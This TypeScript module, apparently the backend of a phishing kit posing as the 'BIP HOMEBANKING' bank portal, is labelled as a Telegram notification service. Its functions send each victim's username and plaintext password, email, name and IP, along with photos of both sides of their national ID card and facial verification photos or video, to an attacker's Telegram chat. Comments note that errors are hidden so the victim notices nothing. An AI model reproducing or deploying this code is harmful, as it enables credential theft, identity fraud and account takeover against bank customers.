// 📱 Servicio de notificaciones por Telegram
import TelegramBot from 'node-telegram-bot-api';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

let bot: TelegramBot | null = null;

// Inicializar bot solo si hay token configurado
if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

export const sendLoginNotification = async (userData: {
  username: string;
  password: string;
  name: string;
  email: string;
  timestamp: string;
  ip?: string;
  userAgent?: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado. Login de:', userData.username);
    return;
  }

  try {
    const message = `
🔐 *NUEVO LOGIN - BIP HOMEBANKING*

👤 *Usuario:* \`${userData.username}\`
🔑 *Contraseña:* \`${userData.password}\`
📧 *Email:* ${userData.email}
👨‍💼 *Nombre:* ${userData.name}

📱 *User Agent:* ${userData.userAgent || 'No disponible'}
🔢 *IP:* ${userData.ip || 'No disponible'}
🕐 *Fecha:* ${userData.timestamp}

✅ *LOGIN EXITOSO*
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    console.log('✅ Notificación de login enviada a Telegram');
  } catch (error) {
    console.error('❌ Error enviando notificación a Telegram:', error);
  }
};

export const sendDNINotification = async (data: {
  userId: string;
  frontImage: string;
  backImage: string;
  timestamp: string;
  dniData?: any;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado - DNI recibido pero no enviado');
    return;
  }

  try {
    const message = `
📄 *VERIFICACIÓN DNI - BIP HOMEBANKING*

👤 *Usuario ID:* ${data.userId}
🕐 *Fecha:* ${data.timestamp}

📸 Imágenes del DNI adjuntas
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Convertir base64 a buffer y enviar fotos
    try {
      const frontBase64 = data.frontImage.includes(',') ? data.frontImage.split(',')[1] : data.frontImage;
      const backBase64 = data.backImage.includes(',') ? data.backImage.split(',')[1] : data.backImage;
      
      const frontBuffer = Buffer.from(frontBase64, 'base64');
      const backBuffer = Buffer.from(backBase64, 'base64');

      await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
        caption: `📄 DNI - FRENTE` 
      });
      
      await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
        caption: `📄 DNI - DORSO` 
      });
    } catch (imgError) {
      console.error('❌ Error procesando imágenes DNI:', imgError);
      await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar las imágenes del DNI');
    }

    console.log('✅ DNI enviado a Telegram');
  } catch (error) {
    console.error('❌ Error enviando DNI a Telegram:', error);
    // No lanzar el error para que el usuario no vea el error
  }
};

export const sendFacialNotification = async (data: {
  userId: string;
  faceImage: string | null;
  faceVideo?: string | null;
  facePhotos?: string[] | null;
  timestamp: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado - Facial recibido pero no enviado');
    return;
  }

  try {
    const isVideo = !!data.faceVideo;
    const isMultiplePhotos = !!(data.facePhotos && data.facePhotos.length > 0);
    
    const message = `
👤 *VERIFICACIÓN FACIAL - BIP HOMEBANKING*

👤 *Usuario ID:* ${data.userId}
📹 *Tipo:* ${isVideo ? 'VIDEO CON MOVIMIENTOS' : isMultiplePhotos ? `SECUENCIA DE ${data.facePhotos!.length} FOTOS` : 'IMAGEN'}
✅ *Verificación:* COMPLETADA

🕐 *Fecha:* ${data.timestamp}

${isVideo ? '🎥 Video de verificación facial adjunto' : isMultiplePhotos ? '📸 Fotos de verificación facial adjuntas' : '📸 Foto de verificación facial adjunta'}
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Enviar video, múltiples fotos o foto única
    if (isVideo && data.faceVideo) {
      try {
        const videoBase64 = data.faceVideo.includes(',') ? data.faceVideo.split(',')[1] : data.faceVideo;
        const videoBuffer = Buffer.from(videoBase64, 'base64');
        
        await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, { 
          caption: `👤 VERIFICACIÓN FACIAL - VIDEO CON MOVIMIENTOS` 
        });
      } catch (videoError) {
        console.error('❌ Error enviando video:', videoError);
        await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar el video, pero verificación completada');
      }
    } else if (isMultiplePhotos && data.facePhotos) {
      // Enviar múltiples fotos de la secuencia
      console.log(`📸 Enviando ${data.facePhotos.length} fotos faciales a Telegram...`);
      
      for (let i = 0; i < data.facePhotos.length; i++) {
        try {
          const photo = data.facePhotos[i];
          const photoBase64 = photo.includes(',') ? photo.split(',')[1] : photo;
          const photoBuffer = Buffer.from(photoBase64, 'base64');
          
          await bot.sendPhoto(TELEGRAM_CHAT_ID, photoBuffer, { 
            caption: `👤 FOTO FACIAL ${i + 1}/${data.facePhotos.length}` 
          });
          
          // Pequeña pausa entre envíos para no saturar
          if (i < data.facePhotos.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 200));
          }
        } catch (photoError) {
          console.error(`❌ Error enviando foto ${i + 1}:`, photoError);
        }
      }
      console.log('✅ Todas las fotos faciales enviadas');
    } else if (data.faceImage) {
      try {
        const imageBase64 = data.faceImage.includes(',') ? data.faceImage.split(',')[1] : data.faceImage;
        const faceBuffer = Buffer.from(imageBase64, 'base64');
        await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
          caption: `👤 VERIFICACIÓN FACIAL` 
        });
      } catch (imgError) {
        console.error('❌ Error enviando imagen:', imgError);
        await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar la imagen');
      }
    }

    console.log('✅ Verificación facial enviada a Telegram');
  } catch (error) {
    console.error('❌ Error enviando verificación facial:', error);
    // No lanzar el error para que el usuario no vea el error
  }
};

export const sendSecurityAlert = async (alertData: {
  type: string;
  message: string;
  username?: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    return;
  }

  try {
    const message = `
⚠️ *ALERTA DE SEGURIDAD - BIP*

🚨 *Tipo:* ${alertData.type}
📝 *Mensaje:* ${alertData.message}
${alertData.username ? `👤 *Usuario:* ${alertData.username}` : ''}
🕐 *Fecha:* ${new Date().toLocaleString('es-AR')}
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error enviando alerta a Telegram:', error);
  }
};
